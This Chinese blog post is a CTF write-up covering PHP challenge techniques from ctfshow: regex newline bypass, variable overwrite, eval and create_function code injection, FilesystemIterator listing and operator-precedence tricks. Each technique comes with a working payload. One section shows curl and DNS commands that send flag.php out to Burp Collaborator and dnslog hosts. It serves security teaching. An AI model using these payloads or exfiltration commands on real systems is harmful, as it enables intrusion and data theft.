CTF中PHP相关题目考点总结（二）

[ H_00c8](https://www.jianshu.com/u/3cf70976a08b)关注赞赏支持

# CTF中PHP相关题目考点总结（二）

image.png

## 介绍

本篇文章主要总结了我在写ctfshow题目中遇到的关于PHP的考点。因为只总结知识点和考点会比较空洞，也不容易理解，所以我都是通过题目来总结考点，这样的话比较容易理解。

## PHP特性相关考点

## 一、

考点：php正则表达式的匹配模式差异。

**例题：**

    
    
    show_source(__FILE__);
    include('flag.php');
    $a=$_GET['cmd'];
    if(preg_match('/^php$/im', $a)){           #/i表示不区分大小写，/m表示多行匹配
        if(preg_match('/^php$/i', $a)){
            echo 'hacker';
        }
        else{
            echo $flag;
        }
    }
    else{
        echo 'nonononono';
    }
    

**例题分析：**

字符 ^ 和 ![同时使用时，表示精确匹配，需要匹配到以php开头和以php结尾的字符串才会返回true，否则返回false\\ /m
多行匹配模式下，若存在换行\\n并且有开始^或结束](https://math.jianshu.com/math?formula=%E5%90%8C%E6%97%B6%E4%BD%BF%E7%94%A8%E6%97%B6%EF%BC%8C%E8%A1%A8%E7%A4%BA%E7%B2%BE%E7%A1%AE%E5%8C%B9%E9%85%8D%EF%BC%8C%E9%9C%80%E8%A6%81%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BB%A5php%E5%BC%80%E5%A4%B4%E5%92%8C%E4%BB%A5php%E7%BB%93%E5%B0%BE%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%8D%E4%BC%9A%E8%BF%94%E5%9B%9Etrue%EF%BC%8C%E5%90%A6%E5%88%99%E8%BF%94%E5%9B%9Efalse%5C%20%2Fm%20%E5%A4%9A%E8%A1%8C%E5%8C%B9%E9%85%8D%E6%A8%A1%E5%BC%8F%E4%B8%8B%EF%BC%8C%E8%8B%A5%E5%AD%98%E5%9C%A8%E6%8D%A2%E8%A1%8C%5Cn%E5%B9%B6%E4%B8%94%E6%9C%89%E5%BC%80%E5%A7%8B%5E%E6%88%96%E7%BB%93%E6%9D%9F)符的情况下，将以换行为分隔符，逐行进行匹配。因此当我们传入以下payload时，第一个if正则匹配会返回true。但是当不是多行匹配模式的时候也就是在第二个if正则匹配中出现换行符`%0a`的时，$cmd的值会被当做两行处理，因此当我们传入以下payload时，第二个if正则表达式匹配到的是aaaphp，不符合以php开头和以php结尾会返回false，从而echo出flag。

payload如下：

    
    
    ?cmd=aaa%0aphp            #%0a为换行符
    

>
> [**【相关技术文档】**](https://links.jianshu.com/go?to=https%3A%2F%2Fwww.oschina.net%2Faction%2FGoToLink%3Furl%3Dhttps%253A%252F%252Fdocs.qq.com%252Fdoc%252FDVExrc2JqUU1DWWd5)

## 二、

考点：php变量覆盖。

**例题：**

    
    
    <?php
    highlight_file(__FILE__);
    include('flag.php');
    error_reporting(0);
    $error='你还想要flag嘛？';
    $suces='既然你想要那给你吧！';
    foreach($_GET as $key => $value){
        if($key==='error'){
            die("what are you doing?!");
        }
        $$key=$$value;
    }foreach($_POST as $key => $value){
        if($value==='flag'){
            die("what are you doing?!");
        }
        $$key=$$value;
    }
    if(!($_POST['flag']==$flag)){
        die($error);
    }
    echo "your are good".$flag."\n";
    die($suces);
    ?>
    

**例题分析：**

这里利用的是变量覆盖，关键点在

key=key=

value，这里把$key的值当作了变量。

    
    
    例如 $key=flag  则$$key=$flag
    

这里一共有三个变量，![error、](https://math.jianshu.com/math?formula=error%E3%80%81)suces和![flag；这里通过die\(](https://math.jianshu.com/math?formula=flag%EF%BC%9B%E8%BF%99%E9%87%8C%E9%80%9A%E8%BF%87die\()error)或者die($suces)都可以输出flag，所以有两个payload。

**第一种：**  
通过die(![error\)输出flag，首先我们把](https://math.jianshu.com/math?formula=error\)%E8%BE%93%E5%87%BAflag%EF%BC%8C%E9%A6%96%E5%85%88%E6%88%91%E4%BB%AC%E6%8A%8A)flag的值传给![test，接着再把](https://math.jianshu.com/math?formula=test%EF%BC%8C%E6%8E%A5%E7%9D%80%E5%86%8D%E6%8A%8A)test的值传给![error，于是](https://math.jianshu.com/math?formula=error%EF%BC%8C%E4%BA%8E%E6%98%AF)error的值就是flag，再通过if判断die输出就是flag。  
例如![flag=ctfshow{xxxxx}，?test=flag，通过第一个for循环，也就是](https://math.jianshu.com/math?formula=flag%3Dctfshow%7Bxxxxx%7D%EF%BC%8C%3Ftest%3Dflag%EF%BC%8C%E9%80%9A%E8%BF%87%E7%AC%AC%E4%B8%80%E4%B8%AAfor%E5%BE%AA%E7%8E%AF%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF)test=![flag，从而把变量flag的值赋给test变量，因此](https://math.jianshu.com/math?formula=flag%EF%BC%8C%E4%BB%8E%E8%80%8C%E6%8A%8A%E5%8F%98%E9%87%8Fflag%E7%9A%84%E5%80%BC%E8%B5%8B%E7%BB%99test%E5%8F%98%E9%87%8F%EF%BC%8C%E5%9B%A0%E6%AD%A4)test=ctfshow{xxxxx}，接着再通过第二个for循环，![error=](https://math.jianshu.com/math?formula=error%3D)test，此时$error=ctfshow{xxxxx}
paylload如下：

    
    
    ?test=flag
    
    post:
    error=test
    

**第二种：**  
通过die(![suces\)输出flag，首先我们把flag的值传给suces变量，接着再把flag的值给置空，以达到下面if条件为0不执行死亡函数的目的，从而往下执行，die\(](https://math.jianshu.com/math?formula=suces\)%E8%BE%93%E5%87%BAflag%EF%BC%8C%E9%A6%96%E5%85%88%E6%88%91%E4%BB%AC%E6%8A%8Aflag%E7%9A%84%E5%80%BC%E4%BC%A0%E7%BB%99suces%E5%8F%98%E9%87%8F%EF%BC%8C%E6%8E%A5%E7%9D%80%E5%86%8D%E6%8A%8Aflag%E7%9A%84%E5%80%BC%E7%BB%99%E7%BD%AE%E7%A9%BA%EF%BC%8C%E4%BB%A5%E8%BE%BE%E5%88%B0%E4%B8%8B%E9%9D%A2if%E6%9D%A1%E4%BB%B6%E4%B8%BA0%E4%B8%8D%E6%89%A7%E8%A1%8C%E6%AD%BB%E4%BA%A1%E5%87%BD%E6%95%B0%E7%9A%84%E7%9B%AE%E7%9A%84%EF%BC%8C%E4%BB%8E%E8%80%8C%E5%BE%80%E4%B8%8B%E6%89%A7%E8%A1%8C%EF%BC%8Cdie\()suces)即可把flag输出，payload如下：

    
    
    ?suces=flag&flag=
    

### 三、

考点：PHP异常处理的利用， **Exception** 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类。

**例题：**

    
    
    <?php
    highlight_file(__FILE__);
    error_reporting(0);
    if(isset($_GET['v1']) && isset($_GET['v2'])){
        $v1 = $_GET['v1'];
        $v2 = $_GET['v2'];
    
        if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){
                eval("echo new $v1($v2());");
        }
    }
    

**例题分析：**

这里传入两个参数，并且都需要有字母，我们用php内置类让v1不进行报错，v2执行我们的命令就好了。

> **Exception** 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类。

所以payload如下：

    
    
    ?v1=Exception&v2=system('tac fl36dg.txt')
    

## 四、

考点一：PHP变量名由数字字母下划线组成，是没有.的 我从大佬的文章了解到，GET或POST方式传进去的变量名，会自动将空格 + . [转换为_。

**例题：**

    
    
    <?php
    error_reporting(0);
    highlight_file(__FILE__);
    include("flag.php");
    $a=$_SERVER['argv'];
    $c=$_POST['fun'];
    if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
        if(!preg_match("/\\|/|~|`|!|@|#|%|^|*|-|+|=|{|}|"|'|,|.|;|?/", $c)&&$c<=18){
             eval("$c".";");
             if($fl0g==="flag_give_me"){
                 echo $flag;
             }
        }
    }
    

**例题分析：**

这道题其中的一个难点是下面这行代码：

    
    
    if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g']))
    

PHP变量名由数字字母下划线组成，是没有.的 我从大佬的文章了解到，GET或POST方式传进去的变量名，会自动将空格 + . [转换为_。

有一种特殊情况，GET或POST方式传参时,变量名中的 [ 也会被替换为_,但其后的字符就再进行替换了  
如 CTF[SHOW.COM => CTF_SHOW.COM 所以payload如下：

    
    
    POST: CTF_SHOW=&CTF[SHOW.COM=&fun=echo $flag
    

很明显这个解是非预期的，其实是可以通过正常步骤得到flag的。

出题人的 **预期解**

    
    
    get: a=1+fl0g=flag_give_me
    post: CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
    

因为上面的代码中的这个代码语句
![a=](https://math.jianshu.com/math?formula=a%3D)_SERVER['argv'];
会将url传入的变量存入数组a中，然后我们配合parse_str函数从数组a中取出fl0g=flag_give_me，配合eval函数，从而给fl0g变量赋值，这样就可以绕过if语句，从而echo出flag。

> `$_SERVER['argv'][0] = $_SERVER['QUERY_STRING']`  
>  query string是Uniform Resource Locator (URL)的一部分, 其中包含着需要传给web
> application的数据

这里进行了本地测试，注意需要在php.ini开启register_argc_argv配置项，测试代码为：

    
    
    <?php
    $a=$_SERVER['argv'];
    var_dump($a);
    

image

所以如果我们get传入变量赋值语句，接着在post里面来执行这个赋值语句就可以完美绕过。

## 五、

考点一：利用php内置类FilesystemIterator 获取指定目录下的所有文件名。

考点二：getcwd()函数的作用时返回当前工作目录。

**例题：**

    
    
    <?php
    highlight_file(__FILE__);
    error_reporting(0);
    if(isset($_GET['v1']) && isset($_GET['v2'])){
        $v1 = $_GET['v1'];
        $v2 = $_GET['v2'];
        if(preg_match('/~|`|!|@|#|\$|%|^|&|*|(|)|_|-|+|=|{|[|;|:|"|'|,|.|?|\\|/|[0-9]/', $v1)){
                die("error v1");
        }
        if(preg_match('/~|`|!|@|#|\$|%|^|&|*|(|)|_|-|+|=|{|[|;|:|"|'|,|.|?|\\|/|[0-9]/', $v2)){
                die("error v2");
        }
    
        eval("echo new $v1($v2());");
    }
    ?>
    

**例题分析：**

这里正则进行了匹配，我们可以使用FilesystemIterator文件系统迭代器来进行利用，通过新建FilesystemIterator，使用getcwd()来显示当前目录下的所有文件的文件名，payload为：

    
    
    ?v1=FilesystemIterator&v2=getcwd
    

知道flag所在文件的文件名和目录后直接访问即可获得flag。

## 六、

考点一：PHP中逻辑运算符&&运算符比||运算符优先级高。

考点二：PHP中逻辑运算符&&和||执行的流程。

**例题：**

    
    
    <?php
    include("flag.php");
    highlight_file(__FILE__);
    if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
        $username = (String)$_GET['username'];
        $password = (String)$_GET['password'];
        $code = (String)$_GET['code'];
        if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
    
            if($code == 'admin'){
                echo $flag;
            }
        }
    }
    

**例题分析：**

分析代码：由于&&运算符比||运算符优先级高，并且我们不知道随机数产生啥，所以![code ===
mt_rand\(1,0x36D\)的结果是false,同时我们看到code的值需要为admin，所以我们设置code=admin，又由于与运算（&&）一假则假，所以不再判断](https://math.jianshu.com/math?formula=code%20%3D%3D%3D%20mt_rand\(1%2C0x36D\)%E7%9A%84%E7%BB%93%E6%9E%9C%E6%98%AFfalse%2C%E5%90%8C%E6%97%B6%E6%88%91%E4%BB%AC%E7%9C%8B%E5%88%B0code%E7%9A%84%E5%80%BC%E9%9C%80%E8%A6%81%E4%B8%BAadmin%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E8%AE%BE%E7%BD%AEcode%3Dadmin%EF%BC%8C%E5%8F%88%E7%94%B1%E4%BA%8E%E4%B8%8E%E8%BF%90%E7%AE%97%EF%BC%88%26%26%EF%BC%89%E4%B8%80%E5%81%87%E5%88%99%E5%81%87%EF%BC%8C%E6%89%80%E4%BB%A5%E4%B8%8D%E5%86%8D%E5%88%A4%E6%96%AD)password
=== $flag 的部分，然后就变成了：

    
    
    if(false|| $username ==="admin")
    

又由于或运算（||）一真则真，所以我们只要把username设置成admin即可，所以payload如下：

    
    
    ?username=admin&code=admin&password=1
    

**补充：**

**一、PHP中逻辑运算符 &&和||的分析：**

首先，我给出一段代码：

    
    
    <?php
        $test="李四";
        $test=="张三"&&$test="张三来了";
        echo $test;  //输出“李四”
        $test="李四";
        $test=="张三"||$test="张三不在这里";
        echo $test;  //输出“张三不在这里”
    ?>
    

为什么会产生这样的结果呢？如果按照平常的方法，我们最少要用个IF语句来判断。可现在只是两个逻辑运算就会把变量的值给改变了。下面我们来分析一下它的运行原理。

在参与逻辑运算的两边表达式中，是按照从左到右顺序进行运算的。而“与”运算中只要有一个是假，整个表达式的结果为假。所以，当左边表达式为假时，就无
需再进行运算了。这样的处理无疑对程序的运行效率是大有好处的。所以说正如题目所说，是一种高效的用法。而逻辑或就不同了：只要一个为真那整个表达式就为
真。所以，在左边为假的情况下，还要运行右边的表达式判断。明白或理解了上面所说，也就对结果不感到奇怪了。

最后，我们做以下总结：  
对于“与”（ **& &** ） 运算： **x && y**当 **x** 为 **false** 时，直接跳过，不执行 **y** ；  
对于“或”（ **||** ） 运算 ： **x||y** 当 **x** 为 **true** 时，直接跳过，不执行 **y** 。

**二、PHP运算符优先级一览表：**

**优先级** | **结合方向** | **运算符** | **附加信息**  
---|---|---|---  
1 | 无结合 | clone、new | clone 和 new  
2 | 从右向左 | ** | 算术运算符  
3 | 从右向左 | ++、--、~、(int)、(float)、(string)、(array)、(object)、(bool)、@ |
类型、递增／递减、错误控制  
4 | 无结合 | instanceof | 类型  
5 | 从右向左 | ! | 逻辑运算符  
6 | 从左向右 | *、/、% | 算术运算符  
7 | 从左向右 | +、-、. | 算术运算符和字符串运算符  
8 | 从左向右 | <<、>> | 位运算符  
9 | 无结合 | <、<=、>、>= | 比较运算符  
10 | 无结合 | ==、!=、===、!==、<>、<=> | 比较运算符  
11 | 从左向右 | & | 位运算符和引用  
12 | 从左向右 | ^ | 位运算符  
13 | 从左向右 |  |  | 位运算符  
14 | 从左向右 | && | 逻辑运算符  
15 | 从左向右 |  |  |  | 逻辑运算符  
16 | 从右向左 | ?? | null 合并运算符  
17 | 从左向右 | ? : | 三元运算符  
18 | 从右向左 | =、+=、-=、 _=、_ *=、/=、.=、%=、&=、 | =、^=、<<=、>>= | 赋值运算符  
19 | 从左向右 | and | 逻辑运算符  
20 | 从左向右 | xor | 逻辑运算符  
21 | 从左向右 | or | 逻辑运算符  
  
对具有相同优先级的运算符来说，从左向右的结合方向意味着将从左向右求值，从右向左结合方向则反之。对于无结合方向的则具有相同优先级的运算符，该运算符有可能无法与其自身结合。

## 七、

考点一：命令执行的骚操作：curl -F命令的使用。

考点二：Burp Collaborator 的使用和带外攻击的概念与流程。

**例题：**

    
    
    <?php
    error_reporting(0);
    highlight_file(__FILE__);
    //flag.php
    if($F = @$_GET['F']){
        if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
            eval(substr($F,0,6));
        }else{
            die("6个字母都还不够呀?!");
        }
    }
    

**例题分析：**

这个题主要是考察，命令执行的骚操作和curl
-F的使用，分析一下代码发现仿佛是只能读取前面6个字符去执行命令，禁止了命令执行的函数，并且没有写入权限。那如果我们传递的参数就是`$F`本身，会不会发生变量覆盖？

那我们来一个简单的测试。

    
    
    我们传递?F=`$F`;+sleep 3   发现网站确实sleep了一会，说明的确执行了sleep命令
    **那为什么会这样？**
    因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数
    这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。
    而$F就是我们输入的`$F`;+sleep 3    所以最后执行的代码应该是
    ``$F`;+sleep 3`,所以就可以成功执行sleep函数
    这里可能有点绕，可以慢慢理解下。
    

然后就是利用curl去带出flag.php

    
    
    # payload：
    #其中-F 为带文件的形式发送post请求
    #xx是上传文件的name值，flag.php就是上传的文件 
    # payload中的url地址是我们从Collaborator Client上获取到的，点击copy to clipboard即可获得
    
    ?F=`$F`;+curl -X POST -F xx=@flag.php  http://qa42kvxuxk5mxr5twr0d84hgf7lx9m.burpcollaborator.net
    

我们在目标页面输入payload并发送后，然后点击Poll now即可看到Burp的
Collaborator服务器与目标服务器的通信数据包，从而我们可以看到flag。

image

另外我们还可以利用dns带外来获取flag：

    
    
    payload:
    
    ?F = `$F`; curl `cat flag.php|grep "flag"`.hxmwnm.dnslog.cn
    

**补充:**

**Burp Collaborator
的使用和带外攻击的概念与流程总。结:**[https://blog.csdn.net/fageweiketang/article/details/89073662](https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Ffageweiketang%2Farticle%2Fdetails%2F89073662)

## 八、

考点一：使用`create_function()`代码注入

考点二：php里的默认命名空间相关知识

**例题：**

    
    
    <?php
    highlight_file(__FILE__);
    
    if(isset($_POST['ctf'])){
        $ctfshow = $_POST['ctf'];
        if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
            $ctfshow('',$_GET['show']);
        }
    }
    

这道题对ctf变量进行了一个正则表达式过滤，post传参的`ctf`和get传参的`show`进行了组合，这里我们可以使用`create_function()`进行代码注入

> string create_function ( string args , string args , string code )
>
> string ![args 变量部分\\
> string](https://math.jianshu.com/math?formula=args%20%E5%8F%98%E9%87%8F%E9%83%A8%E5%88%86%5C%20string)code
> 方法代码部分
    
    
    #本地测试代码
    create_function('$test','echo $test."very cool"')
    //等于
    function f($test){
        echo $test."very cool";
    } 
    
    /*利用如下
    如果我们第二个参数输入的是'echo 111;}phpinfo();//'
    即可把前面的方法括号给闭合并且成功执行phpinfo命令，后面用//注释掉后边的语句
    也就是下面这个结构
    */
    function f($dotast){
        echo 111;
    }
    phpinfo();//}
    

而正则表达式我们可以用`进行绕过，正好`在php里代表默认命名空间。

> php里默认命名空间是\，所有原生函数和类都在这个命名空间中。
> 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；
> 而如果是\function_name()这样的形式去调用函数，则是表示写了一个绝对路径。
> 如果你在其他namespace里调用系统类，必须使用绝对路径的写法

最终payload为

    
    
    ?show=echo 123;}system("tac flag.php");//
    
    post:
    ctf=\create_function
    

### 推荐阅读[更多精彩内容 __](https://www.jianshu.com/)

  * [CTF题目中遇到的PHP考点总结（一）](https://www.jianshu.com/p/b745025ab36f)

介绍 本篇文章主要总结了我在写ctfshow题目中遇到的关于PHP的考点。因为只总结知识点和考点会比较空洞，也不容...

[H_00c8](https://www.jianshu.com/u/3cf70976a08b)阅读 796评论 0赞 4

  * [PHP基础（一）总结](https://www.jianshu.com/p/d1e5ebdb0791)

PHP基础知识 1. 引用变量 概念：在PHP中引用意味着用不同的名字访问同一个变量内容。 定义方式：使用&符号 ...

[LeeShun](https://www.jianshu.com/u/8fbd4cd8ebe7)阅读 246评论 0赞 0

  * [Python（1）—— 选择结构，循环结构，字符串和列表](https://www.jianshu.com/p/c4ac170ed5d3)

一、Python的基础知识： *基础知识： ROM是只读内存，用于存储操作系统，存进去以后只能读取不能修改；RAM...

[MAVIS_42bf](https://www.jianshu.com/u/1b523182ad19)阅读 869评论 0赞 1

  * [javascript基础总结](https://www.jianshu.com/p/69f9c92dc210)

ECMAscript 基础语法 变量 数据类型 运算符 数组 函数 对象 BOM 浏览器对象模型 window对象...

[浅笑_](https://www.jianshu.com/u/0d013d136214)阅读 154评论 0赞 0

  * [学习笔记-java相关](https://www.jianshu.com/p/f3702fc35904)

从几个月前就说要学javaweb。结果一直在拖。现在开篇文章强迫自己写写笔记。 大体上打算从常见漏洞和框架使用两个...

[byc_404](https://www.jianshu.com/u/3a00738ba39e)阅读 969评论 0赞 0

 